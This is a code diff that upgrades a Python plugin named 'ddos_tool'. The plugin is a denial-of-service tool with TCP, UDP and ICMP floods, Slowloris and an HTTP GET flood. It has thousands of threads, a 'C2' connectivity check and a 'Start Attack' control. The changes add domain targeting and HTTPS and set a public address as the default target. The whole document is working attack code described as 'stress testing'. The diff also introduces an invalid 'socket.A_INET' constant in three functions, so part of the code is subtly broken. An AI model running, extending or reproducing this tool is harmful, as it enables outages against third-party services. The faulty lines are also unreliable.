@@ -5,26 +5,33 @@ import time
 import random
 import subprocess
 import sys
+import ssl
 from plugin_sdk import Plugin, Field
 
 # ==================== ATTACK IMPLEMENTATIONS ====================
 
 class AttackMethods:
-    """Built-in attack methods using only standard library"""
     
     @staticmethod
-    def tcp_flood(target_ip, target_port, duration, stop_event):
-        """TCP SYN flood - opens connections rapidly"""
+    def resolve_target(target):
+        """Resolve domain to IP if needed"""
+        try:
+            socket.inet_aton(target)
+            return target  # Already an IP
+        except socket.error:
+            return socket.gethostbyname(target)  # Resolve domain
+    
+    @staticmethod
+    def tcp_flood(target, port, duration, stop_event):
+        target_ip = AttackMethods.resolve_target(target)
         end_time = time.time() + duration
         count = 0
         while time.time() < end_time and not stop_event.is_set():
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(1)
-                sock.connect((target_ip, target_port))
-                # Send garbage data
-                payload = random._urandom(1024)
-                sock.send(payload)
+                sock = socket.socket(socket.A_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((target_ip, port))
+                sock.send(random._urandom(1024))
                 count += 1
                 sock.close()
             except:
@@ -32,57 +39,50 @@ class AttackMethods:
         return count
     
     @staticmethod
-    def udp_flood(target_ip, target_port, duration, stop_event):
-        """UDP flood - sends UDP packets rapidly"""
+    def udp_flood(target, port, duration, stop_event):
+        target_ip = AttackMethods.resolve_target(target)
         end_time = time.time() + duration
         count = 0
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = random._urandom(65507)  # Max UDP payload
+        sock = socket.socket(socket.A_INET, socket.SOCK_DGRAM)
+        payload = random._urandom(65507)
         
         while time.time() < end_time and not stop_event.is_set():
             try:
-                sock.sendto(payload, (target_ip, target_port))
+                sock.sendto(payload, (target_ip, port))
                 count += 1
             except:
                 pass
         return count
     
     @staticmethod
-    def icmp_flood(target_ip, duration, stop_event):
-        """ICMP flood using raw socket (requires admin on some systems)"""
+    def icmp_flood(target, duration, stop_event):
+        target_ip = AttackMethods.resolve_target(target)
         end_time = time.time() + duration
         count = 0
         
         try:
-            # Try to create raw socket for ICMP
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            sock = socket.socket(socket.A_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         except PermissionError:
-            # Fallback to standard ping subprocess spam
             while time.time() < end_time and not stop_event.is_set():
                 try:
+                    ping_cmd = ["ping", "-c", "1", "-s", "65507", target_ip]
                     if sys.platform == "win32":
-                        subprocess.Popen(["ping", "-n", "1", "-l", "65500", target_ip], 
-                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    else:
-                        subprocess.Popen(["ping", "-c", "1", "-s", "65507", target_ip],
-                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        ping_cmd = ["ping", "-n", "1", "-l", "65500", target_ip]
+                    subprocess.Popen(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     count += 1
                 except:
                     pass
             return count
         
-        # Raw ICMP if we have permissions
         icmp_id = random.randint(0, 65535)
         icmp_seq = 0
         payload = random._urandom(56)
         
         while time.time() < end_time and not stop_event.is_set():
             try:
-                # ICMP Echo Request header: type=8, code=0, checksum, id, seq
                 header = bytes([8, 0, 0, 0, (icmp_id >> 8) & 0xff, icmp_id & 0xff,
                                (icmp_seq >> 8) & 0xff, icmp_seq & 0xff])
-                packet = header + payload
-                sock.sendto(packet, (target_ip, 0))
+                sock.sendto(header + payload, (target_ip, 0))
                 icmp_seq = (icmp_seq + 1) % 65536
                 count += 1
             except:
@@ -90,37 +90,58 @@ class AttackMethods:
         return count
     
     @staticmethod
-    def slowloris(target_ip, target_port, duration, stop_event):
-        """Slowloris - partial HTTP requests that hold connections open"""
+    def slowloris(target, port, duration, use_ssl, stop_event):
+        """Slowloris with optional HTTPS support"""
         end_time = time.time() + duration
         sockets = []
         count = 0
         
+        # Determine if we should use SSL based on port or explicit flag
+        is_ssl = use_ssl or (port == 443)
+        
         while time.time() < end_time and not stop_event.is_set():
-            # Maintain pool of slow connections
             for _ in range(50):
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(4)
-                    sock.connect((target_ip, target_port))
-                    # Send partial HTTP request
-                    sock.send(b"GET / HTTP/1.1\r\n")
-                    sock.send(f"Host: {target_ip}\r\n".encode())
-                    sockets.append(sock)
+                    
+                    # Resolve if domain
+                    try:
+                        socket.inet_aton(target)
+                        conn_target = target
+                    except socket.error:
+                        conn_target = socket.gethostbyname(target)
+                    
+                    sock.connect((conn_target, port))
+                    
+                    # Wrap with SSL if HTTPS
+                    if is_ssl:
+                        context = ssl.create_default_context()
+                        sock = context.wrap_socket(sock, server_hostname=target)
+                    
+                    # Send partial HTTP request (use domain for Host header if available)
+                    host_header = target if not target.replace('.','').isdigit() else conn_target
+                    
+                    sock.send(f"GET / HTTP/1.1\r\nHost: {host_header}\r\n".encode())
+                    sockets.append((sock, time.time()))
                     count += 1
-                except:
+                except Exception as e:
                     pass
             
-            # Keep existing connections alive with headers
-            for sock in sockets[:]:
+            # Keepalive existing connections
+            for sock, create_time in sockets[:]:
                 try:
-                    sock.send(b"X-a: keepalive\r\n")
+                    if time.time() - create_time > 10:  # Refresh old connections
+                        sock.close()
+                        sockets.remove((sock, create_time))
+                    else:
+                        sock.send(b"X-a: keepalive\r\n")
                 except:
-                    sockets.remove(sock)
+                    sockets.remove((sock, create_time))
             
-            time.sleep(5)  # Send keepalive every 5 seconds
-            
-        for sock in sockets:
+            time.sleep(3)
+        
+        for sock, _ in sockets:
             try:
                 sock.close()
             except:
@@ -128,67 +149,81 @@ class AttackMethods:
         return count
     
     @staticmethod
-    def http_get_flood(target_ip, target_port, duration, stop_event):
-        """HTTP GET request flood"""
+    def http_get_flood(target, port, duration, use_ssl, stop_event):
+        """HTTP/HTTPS GET flood"""
         end_time = time.time() + duration
         count = 0
+        is_ssl = use_ssl or (port == 443)
         
-        # Common user agents
         user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
         ]
         
         while time.time() < end_time and not stop_event.is_set():
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                sock.connect((target_ip, target_port))
+                sock.settimeout(3)
                 
+                # Resolve domain if needed
+                try:
+                    socket.inet_aton(target)
+                    conn_target = target
+                except socket.error:
+                    conn_target = socket.gethostbyname(target)
+                
+                sock.connect((conn_target, port))
+                
+                # Wrap with SSL for HTTPS
+                if is_ssl:
+                    context = ssl.create_default_context()
+                    sock = context.wrap_socket(sock, server_hostname=target)
+                
+                host_header = target if not target.replace('.','').isdigit() else conn_target
                 ua = random.choice(user_agents)
-                request = f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n"
+                
+                request = (
+                    f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n"
+                    f"Host: {host_header}\r\n"
+                    f"User-Agent: {ua}\r\n"
+                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    f"Accept-Language: en-US,en;q=0.5\r\n"
+                    f"Accept-Encoding: gzip, deflate\r\n"
+                    f"Connection: keep-alive\r\n\r\n"
+                )
+                
                 sock.send(request.encode())
                 count += 1
                 sock.close()
-            except:
+            except Exception as e:
                 pass
         return count
 
 # ==================== CONNECTIVITY MONITOR ====================
 
 class ConnectivityMonitor:
-    """Monitors C2 connectivity via 1.1.1.1 ping every 3 seconds"""
-    
     def __init__(self):
         self.connected = True
         self.stop_event = threading.Event()
         self.thread = None
     
     def _check_loop(self):
-        """Ping 1.1.1.1 every 3 seconds"""
         while not self.stop_event.is_set():
             try:
+                ping_cmd = ["ping", "-c", "1", "-W", "3", "1.1.1.1"]
                 if sys.platform == "win32":
-                    result = subprocess.run(
-                        ["ping", "-n", "1", "-w", "3000", "1.1.1.1"],
-                        capture_output=True,
-                        timeout=5
-                    )
-                else:
-                    result = subprocess.run(
-                        ["ping", "-c", "1", "-W", "3", "1.1.1.1"],
-                        capture_output=True,
-                        timeout=5
-                    )
+                    ping_cmd = ["ping", "-n", "1", "-w", "3000", "1.1.1.1"]
                 
+                result = subprocess.run(ping_cmd, capture_output=True, timeout=5)
                 success = result.returncode == 0
+                
                 if not success and self.connected:
                     self.connected = False
                 elif success and not self.connected:
                     self.connected = True
-                    
-            except Exception:
+            except:
                 self.connected = False
             
             time.sleep(3)
@@ -204,11 +239,11 @@ class ConnectivityMonitor:
 
 # ==================== PLUGIN SETUP ====================
 
-# UI Schema following ERRATIC plugin system
 ui = [
     Field.section("Target Configuration"),
-    Field.text("target_ip", label="Target IP", default="127.0.0.1", placeholder="e.g., 192.168.1.1"),
-    Field.number("target_port", label="Target Port", default=80, min_val=1, max_val=65535),
+    Field.text("target", label="Target (IP or Domain)", default="1.1.1.1", placeholder="e.g., 192.168.1.1 or example.com"),
+    Field.number("port", label="Port", default=80, min_val=1, max_val=65535),
+    Field.toggle("use_ssl", label="Use SSL/HTTPS", default=False),
     
     Field.section("Attack Settings"),
     Field.select("attack_type", label="Attack Type", options=[
@@ -217,13 +252,13 @@ ui = [
         {"label": "ICMP Flood", "value": "icmp_flood"},
         {"label": "Slowloris", "value": "slowloris"},
         {"label": "HTTP GET Flood", "value": "http_get"},
-        {"label": "All Methods (Cycle)", "value": "all"}
+        {"label": "All Methods", "value": "all"}
     ], default="tcp_flood"),
     Field.number("threads", label="Threads", default=100, min_val=1, max_val=10000),
     Field.number("duration", label="Duration (seconds)", default=60, min_val=1, max_val=3600),
     
     Field.section("Safety"),
-    Field.toggle("enable_c2_check", label="Enable C2 Connectivity Check (1.1.1.1)", default=True),
+    Field.toggle("enable_c2_check", label="Enable C2 Connectivity Check", default=True),
     
     Field.section("Control"),
     Field.button("start_attack", label="▶ Start Attack"),
@@ -235,9 +270,8 @@ ui = [
     Field.output("log", label="Event Log", height="200px"),
 ]
 
-plugin = Plugin("ddos_tool", "1.0", "Network stress testing tool with C2 safety", ui, author="erratic")
+plugin = Plugin("ddos_tool", "1.1", "Network stress testing with HTTPS/domain support", ui, author="erratic")
 
-# Global state
 attack_state = {
     "running": False,
     "stop_event": threading.Event(),
@@ -256,48 +290,48 @@ def start_attack(args):
         plugin.set_output("log", "[!] Attack already running")
         return {"status": "already_running"}
     
-    # Get parameters
-    target_ip = plugin.get_field("target_ip")
-    target_port = plugin.get_field("target_port")
+    target = plugin.get_field("target")
+    port = plugin.get_field("port")
     attack_type = plugin.get_field("attack_type")
     thread_count = plugin.get_field("threads")
     duration = plugin.get_field("duration")
     enable_c2 = plugin.get_field("enable_c2_check")
+    use_ssl = plugin.get_field("use_ssl")
     
-    # Validate
+    # Validate target (IP or domain)
     try:
-        socket.inet_aton(target_ip)
+        socket.inet_aton(target)
+        target_type = "IP"
     except socket.error:
-        plugin.set_output("log", f"[!] Invalid IP address: {target_ip}")
-        return {"status": "invalid_ip"}
+        try:
+            socket.gethostbyname(target)
+            target_type = "Domain"
+        except socket.gaierror:
+            plugin.set_output("log", f"[!] Invalid target: {target}")
+            return {"status": "invalid_target"}
     
-    # Reset state
     attack_state["running"] = True
     attack_state["stop_event"].clear()
     attack_state["threads"] = []
     attack_state["stats"] = {"packets_sent": 0, "start_time": time.time(), "method": attack_type}
     
-    # Start connectivity monitor if enabled
     if enable_c2:
         attack_state["monitor"] = ConnectivityMonitor()
         attack_state["monitor"].start()
-        plugin.set_output("log", "[*] C2 connectivity monitor started (1.1.1.1 every 3s)")
+        plugin.set_output("log", "[*] C2 connectivity monitor started")
     
-    plugin.set_output("status", f"ATTACKING {target_ip}:{target_port} via {attack_type}")
-    plugin.log(f"Starting {attack_type} attack on {target_ip}:{target_port} with {thread_count} threads")
+    proto = "HTTPS" if use_ssl or port == 443 else "HTTP"
+    plugin.set_output("status", f"ATTACKING {target}:{port} ({target_type}/{proto}) via {attack_type}")
+    plugin.log(f"Starting {attack_type} on {target}:{port} (SSL={use_ssl})")
     
-    # Launch attack threads
     def attack_worker(method_func, *method_args):
-        """Worker that checks connectivity and runs attack"""
         while not attack_state["stop_event"].is_set():
-            # Check C2 connectivity if enabled
             if enable_c2 and attack_state["monitor"] and not attack_state["monitor"].connected:
-                plugin.set_output("log", "[!] C2 connectivity LOST - stopping attack to prevent isolation")
-                plugin.set_output("status", "STOPPED - C2 connectivity lost")
+                plugin.set_output("log", "[!] C2 connectivity LOST - stopping attack")
+                plugin.set_output("status", "STOPPED - C2 lost")
                 attack_state["stop_event"].set()
                 break
             
-            # Run attack method
             try:
                 result = method_func(*method_args, attack_state["stop_event"])
                 if result:
@@ -305,19 +339,16 @@ def start_attack(args):
             except Exception as e:
                 plugin.log(f"Thread error: {e}")
     
-    # Map attack types to methods
     method_map = {
-        "tcp_flood": (AttackMethods.tcp_flood, (target_ip, target_port, duration)),
-        "udp_flood": (AttackMethods.udp_flood, (target_ip, target_port, duration)),
-        "icmp_flood": (AttackMethods.icmp_flood, (target_ip, duration)),
-        "slowloris": (AttackMethods.slowloris, (target_ip, target_port, duration)),
-        "http_get": (AttackMethods.http_get_flood, (target_ip, target_port, duration)),
+        "tcp_flood": (AttackMethods.tcp_flood, (target, port, duration)),
+        "udp_flood": (AttackMethods.udp_flood, (target, port, duration)),
+        "icmp_flood": (AttackMethods.icmp_flood, (target, duration)),
+        "slowloris": (AttackMethods.slowloris, (target, port, duration, use_ssl)),
+        "http_get": (AttackMethods.http_get_flood, (target, port, duration, use_ssl)),
     }
     
-    # Spawn threads
     for i in range(thread_count):
         if attack_type == "all":
-            # Cycle through all methods
             methods = list(method_map.keys())
             method_name = methods[i % len(methods)]
         else:
@@ -329,7 +360,6 @@ def start_attack(args):
             t.start()
             attack_state["threads"].append(t)
     
-    # Stats reporter thread
     def stats_reporter():
         while attack_state["running"] and not attack_state["stop_event"].is_set():
             time.sleep(5)
@@ -337,18 +367,18 @@ def start_attack(args):
             pps = attack_state["stats"]["packets_sent"] / elapsed if elapsed > 0 else 0
             
             stats_text = (
+                f"Target: {target}:{port}\n"
                 f"Method: {attack_type}\n"
                 f"Duration: {elapsed:.1f}s / {duration}s\n"
                 f"Threads: {thread_count}\n"
-                f"Packets Sent: {attack_state['stats']['packets_sent']}\n"
+                f"Packets: {attack_state['stats']['packets_sent']}\n"
                 f"Rate: {pps:.1f} pkt/sec\n"
-                f"C2 Status: {'CONNECTED' if (not enable_c2 or attack_state['monitor'].connected) else 'DISCONNECTED'}"
+                f"C2: {'UP' if (not enable_c2 or attack_state['monitor'].connected) else 'DOWN'}"
             )
             plugin.set_output("stats", stats_text)
             
-            # Auto-stop after duration
             if elapsed >= duration:
-                plugin.set_output("log", "[*] Duration reached - stopping attack")
+                plugin.set_output("log", "[*] Duration reached")
                 stop_attack({"auto": True})
                 break
     
@@ -356,7 +386,7 @@ def start_attack(args):
     stats_thread.start()
     attack_state["threads"].append(stats_thread)
     
-    return {"status": "started", "target": f"{target_ip}:{target_port}", "method": attack_type}
+    return {"status": "started"}
 
 @plugin.on_command("stop_attack")
 def stop_attack(args):
@@ -369,32 +399,22 @@ def stop_attack(args):
     plugin.set_output("status", "STOPPING...")
     plugin.log("Stopping attack...")
     
-    # Signal stop
     attack_state["stop_event"].set()
     attack_state["running"] = False
     
-    # Stop monitor
     if attack_state["monitor"]:
         attack_state["monitor"].stop()
     
-    # Wait for threads
     for t in attack_state["threads"]:
         t.join(timeout=2)
     
     attack_state["threads"] = []
     
     elapsed = time.time() - attack_state["stats"]["start_time"]
-    final_stats = (
-        f"Attack Stopped\n"
-        f"Total Packets: {attack_state['stats']['packets_sent']}\n"
-        f"Duration: {elapsed:.1f}s"
-    )
-    
     plugin.set_output("status", "STOPPED")
-    plugin.set_output("stats", final_stats)
-    plugin.set_output("log", "[*] Attack stopped successfully")
+    plugin.set_output("stats", f"Attack Complete\nTotal: {attack_state['stats']['packets_sent']} packets\nTime: {elapsed:.1f}s")
+    plugin.set_output("log", "[*] Attack stopped")
     
-    return {"status": "stopped", "packets": attack_state["stats"]["packets_sent"]}
+    return {"status": "stopped"}
 
-# Start event loop
 plugin.run()
